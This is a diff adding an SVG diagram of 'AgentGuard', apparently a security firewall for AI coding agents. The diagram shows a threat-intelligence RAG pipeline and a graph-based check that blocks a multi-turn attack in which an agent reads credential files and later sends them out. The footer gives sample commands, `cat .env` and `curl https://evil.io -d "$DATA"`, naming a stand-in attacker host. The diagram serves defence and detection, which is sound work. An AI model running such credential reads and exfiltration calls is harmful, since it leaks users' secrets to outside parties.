@@ -1,0 +1,132 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1100 540" width="100%" height="auto" font-family="'JetBrains Mono', 'SF Mono', Menlo, Consolas, monospace">
+  <defs>
+    <linearGradient id="bgGrad2" x1="0" y1="0" x2="1" y2="1">
+      <stop offset="0%" stop-color="#050608"/>
+      <stop offset="100%" stop-color="#0a0e14"/>
+    </linearGradient>
+    <marker id="arrC" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+      <path d="M 0 1 L 10 5 L 0 9 z" fill="#00e5ff"/>
+    </marker>
+    <marker id="arrR" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+      <path d="M 0 1 L 10 5 L 0 9 z" fill="#ff3355"/>
+    </marker>
+    <marker id="arrG" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+      <path d="M 0 1 L 10 5 L 0 9 z" fill="#00ff88"/>
+    </marker>
+  </defs>
+
+  <rect width="1100" height="540" rx="10" fill="url(#bgGrad2)" stroke="#1e2633" stroke-width="2"/>
+
+  <!-- Title -->
+  <rect x="20" y="16" width="1060" height="38" rx="6" fill="#0d1117" stroke="#00e5ff" stroke-opacity="0.4"/>
+  <text x="38" y="40" fill="#f3f5f8" font-size="13.5" font-weight="bold" letter-spacing="0.8">5-STAGE THREAT-INTELLIGENCE RAG, COLBERT MAXSIM &amp; GRAPHRAG MULTI-HOP LINEAGE</text>
+
+  <!-- TOP HALF: 5-Stage Pipeline -->
+  <text x="24" y="78" fill="#00e5ff" font-size="11" font-weight="bold" letter-spacing="0.6">A. 5-STAGE DATA LIFECYCLE &amp; HYBRID RETRIEVAL PIPELINE (core/agentguard/rag/)</text>
+
+  <!-- Stage 1 -->
+  <rect x="20" y="90" width="196" height="145" rx="6" fill="#0b0f17" stroke="#2b3548" stroke-width="1.5"/>
+  <text x="32" y="112" fill="#00e5ff" font-size="10.5" font-weight="bold">STAGE 1: SOURCES</text>
+  <text x="32" y="132" fill="#f3f5f8" font-size="9.5">• MITRE ATLAS Tactics</text>
+  <text x="32" y="147" fill="#8c96a8" font-size="8.8">  AML.T0051 / T0048 / T0054</text>
+  <text x="32" y="165" fill="#f3f5f8" font-size="9.5">• OWASP LLM Top 10</text>
+  <text x="32" y="180" fill="#8c96a8" font-size="8.8">  LLM01 / LLM02 / LLM06 / LLM07</text>
+  <text x="32" y="198" fill="#f3f5f8" font-size="9.5">• Live Policy Ingest</text>
+  <text x="32" y="213" fill="#00ff88" font-size="8.8">  POST /v1/rag/ingest · fetch-mcp</text>
+
+  <line x1="216" y1="162" x2="234" y2="162" stroke="#00e5ff" stroke-width="2" marker-end="url(#arrC)"/>
+
+  <!-- Stage 2 -->
+  <rect x="236" y="90" width="196" height="145" rx="6" fill="#0b0f17" stroke="#2b3548" stroke-width="1.5"/>
+  <text x="248" y="112" fill="#00e5ff" font-size="10.5" font-weight="bold">STAGE 2: SEMANTIC CHUNK</text>
+  <text x="248" y="132" fill="#f3f5f8" font-size="9.5">Variable Boundary Split</text>
+  <text x="248" y="149" fill="#8c96a8" font-size="8.8">• Embeds adjacent clauses</text>
+  <text x="248" y="165" fill="#8c96a8" font-size="8.8">• Cuts at cosine valley:</text>
+  <text x="248" y="181" fill="#ffaa00" font-size="9">  cos(s_i-1, s_i) &lt; 0.38</text>
+  <text x="248" y="197" fill="#8c96a8" font-size="8.8">• Bounds: 90..520 chars</text>
+  <text x="248" y="213" fill="#00ff88" font-size="8.8">• Preserves policy clauses</text>
+
+  <line x1="432" y1="162" x2="450" y2="162" stroke="#00e5ff" stroke-width="2" marker-end="url(#arrC)"/>
+
+  <!-- Stage 3 -->
+  <rect x="452" y="90" width="196" height="145" rx="6" fill="#0b0f17" stroke="#00ff88" stroke-opacity="0.55" stroke-width="1.5"/>
+  <text x="464" y="112" fill="#00ff88" font-size="10.5" font-weight="bold">STAGE 3: CONTEXTUAL RAG</text>
+  <text x="464" y="132" fill="#ffaa00" font-size="9.2">1. Pre-Index Secret Redact</text>
+  <text x="464" y="148" fill="#8c96a8" font-size="8.5">   secrets.redact() -&gt; [REDACTED]</text>
+  <text x="464" y="166" fill="#00e5ff" font-size="9.2">2. Anthropic Prefix Prepend</text>
+  <text x="464" y="182" fill="#8c96a8" font-size="8.5">   [Context: Source | Doc |</text>
+  <text x="464" y="196" fill="#8c96a8" font-size="8.5">    Taxonomy | Action | Surface]</text>
+  <text x="464" y="213" fill="#00ff88" font-size="8.8">Prepended BEFORE embedding</text>
+
+  <line x1="648" y1="162" x2="666" y2="162" stroke="#00e5ff" stroke-width="2" marker-end="url(#arrC)"/>
+
+  <!-- Stage 4 -->
+  <rect x="668" y="90" width="196" height="145" rx="6" fill="#0b0f17" stroke="#2b3548" stroke-width="1.5"/>
+  <text x="680" y="112" fill="#00e5ff" font-size="10.5" font-weight="bold">STAGE 4: DUAL INDEXING</text>
+  <text x="680" y="132" fill="#f3f5f8" font-size="9.5">SQLite rag_chunks + KG</text>
+  <text x="680" y="150" fill="#8c96a8" font-size="8.8">• 64-dim Dense Vector:</text>
+  <text x="680" y="164" fill="#8c96a8" font-size="8.5">  10 security concept anchors</text>
+  <text x="680" y="178" fill="#8c96a8" font-size="8.5">  + Blake2b bigram projections</text>
+  <text x="680" y="195" fill="#8c96a8" font-size="8.8">• 32-dim Token Signatures:</text>
+  <text x="680" y="211" fill="#00e5ff" font-size="8.5">  Per-token 3-gram unit vecs</text>
+
+  <line x1="864" y1="162" x2="882" y2="162" stroke="#00ff88" stroke-width="2" marker-end="url(#arrG)"/>
+
+  <!-- Stage 5 -->
+  <rect x="884" y="90" width="196" height="145" rx="6" fill="#0b0f17" stroke="#b388ff" stroke-opacity="0.65" stroke-width="1.5"/>
+  <text x="896" y="112" fill="#b388ff" font-size="10.5" font-weight="bold">STAGE 5: COLBERT + KG</text>
+  <text x="896" y="132" fill="#f3f5f8" font-size="9.2">Late-Interaction Rerank</text>
+  <text x="896" y="148" fill="#00ff88" font-size="8.8">MaxSim(Q,D) = 1/|Q| Σ max(q·d)</text>
+  <text x="896" y="166" fill="#00e5ff" font-size="9">Hybrid Score Fusion:</text>
+  <text x="896" y="181" fill="#f3f5f8" font-size="8.8">45% Dense + 55% ColBERT</text>
+  <text x="896" y="198" fill="#ff3355" font-size="9" font-weight="bold">+ 3-Hop GraphRAG Lineage</text>
+  <text x="896" y="213" fill="#8c96a8" font-size="8.5">Sub-5ms deterministic query</text>
+
+  <!-- BOTTOM HALF: GraphRAG Multi-Hop Attack Lineage Example -->
+  <rect x="20" y="258" width="1060" height="262" rx="8" fill="#090c12" stroke="#ff3355" stroke-opacity="0.5" stroke-width="1.5"/>
+  <text x="36" y="282" fill="#ff3355" font-size="11" font-weight="bold" letter-spacing="0.6">B. GRAPHRAG MULTI-HOP EXFILTRATION CHAIN DETECTION (KnowledgeGraphService · MITRE ATLAS AML.T0048)</text>
+  <text x="36" y="300" fill="#8c96a8" font-size="9.5">How AgentGuard catches multi-turn attacks where Turn 1 reads credentials and Turn 4 exfiltrates them over the network:</text>
+
+  <!-- Node 1: Session -->
+  <rect x="36" y="330" width="160" height="72" rx="6" fill="#101520" stroke="#00e5ff"/>
+  <text x="116" y="354" fill="#00e5ff" font-size="10.5" font-weight="bold" text-anchor="middle">session:ses_abc</text>
+  <text x="116" y="372" fill="#f3f5f8" font-size="9" text-anchor="middle">Coding Agent Session</text>
+  <text x="116" y="388" fill="#8c96a8" font-size="8.5" text-anchor="middle">kind: session</text>
+
+  <line x1="196" y1="366" x2="262" y2="366" stroke="#00e5ff" stroke-width="2" marker-end="url(#arrC)"/>
+  <text x="229" y="356" fill="#00e5ff" font-size="8.5" text-anchor="middle">Hop 1 (Turn 1)</text>
+  <text x="229" y="380" fill="#8c96a8" font-size="8" text-anchor="middle">READ_SENSITIVE</text>
+
+  <!-- Node 2: Sensitive Artifact -->
+  <rect x="264" y="330" width="185" height="72" rx="6" fill="#1a0d12" stroke="#ffaa00"/>
+  <text x="356" y="354" fill="#ffaa00" font-size="10.5" font-weight="bold" text-anchor="middle">artifact:ses_abc:.env</text>
+  <text x="356" y="372" fill="#f3f5f8" font-size="9" text-anchor="middle">.env / id_rsa / aws_creds</text>
+  <text x="356" y="388" fill="#ff3355" font-size="8.5" text-anchor="middle">risk: CRITICAL</text>
+
+  <line x1="449" y1="366" x2="535" y2="366" stroke="#ff3355" stroke-width="2.5" stroke-dasharray="5,3" marker-end="url(#arrR)"/>
+  <text x="492" y="354" fill="#ff3355" font-size="8.5" font-weight="bold" text-anchor="middle">Hop 2 (Turn 4)</text>
+  <text x="492" y="380" fill="#ff3355" font-size="8" text-anchor="middle">EXFILTRATION_PATH</text>
+
+  <!-- Node 3: External Sink -->
+  <rect x="537" y="330" width="195" height="72" rx="6" fill="#1a0d12" stroke="#ff3355"/>
+  <text x="634" y="354" fill="#ff3355" font-size="10.5" font-weight="bold" text-anchor="middle">sink:ses_abc:webhook</text>
+  <text x="634" y="372" fill="#f3f5f8" font-size="9" text-anchor="middle">curl / wget / external host</text>
+  <text x="634" y="388" fill="#ffaa00" font-size="8.5" text-anchor="middle">CONNECTED_EXTERNAL</text>
+
+  <line x1="732" y1="366" x2="808" y2="366" stroke="#ff3355" stroke-width="2" marker-end="url(#arrR)"/>
+  <text x="770" y="356" fill="#ff3355" font-size="8.5" text-anchor="middle">Hop 3</text>
+  <text x="770" y="380" fill="#8c96a8" font-size="8" text-anchor="middle">MATCHES</text>
+
+  <!-- Node 4: MITRE Verdict -->
+  <rect x="810" y="322" width="250" height="88" rx="6" fill="#240b12" stroke="#ff3355" stroke-width="2"/>
+  <text x="935" y="345" fill="#ff3355" font-size="11" font-weight="bold" text-anchor="middle">FIREWALL: BLOCK</text>
+  <text x="935" y="363" fill="#f3f5f8" font-size="9.5" font-weight="bold" text-anchor="middle">rule: graphrag.AML.T0048</text>
+  <text x="935" y="380" fill="#ffaa00" font-size="9" text-anchor="middle">weight: 80.0 · conf: 0.92</text>
+  <text x="935" y="396" fill="#00ff88" font-size="8.5" text-anchor="middle">Exfiltration aborted pre-exec</text>
+
+  <!-- Taxonomy Footer inside GraphRAG box -->
+  <rect x="36" y="424" width="1024" height="78" rx="5" fill="#0d1117" stroke="#1e2633"/>
+  <text x="52" y="446" fill="#00ff88" font-size="10" font-weight="bold">WHY GRAPHRAG MATTERS FOR CODING AGENTS:</text>
+  <text x="52" y="465" fill="#dbe0ea" font-size="9.2">• Single-turn stateless scanners see Turn 1 (`cat .env`) as a normal developer file read and Turn 4 (`curl https://evil.io -d "$DATA"`) as a generic HTTP call.</text>
+  <text x="52" y="483" fill="#dbe0ea" font-size="9.2">• KnowledgeGraphService persists `READ_SENSITIVE` edges per session in SQLite (`kg_edges`), immediately linking any subsequent outbound network sink to MITRE ATLAS AML.T0048.</text>
+</svg>
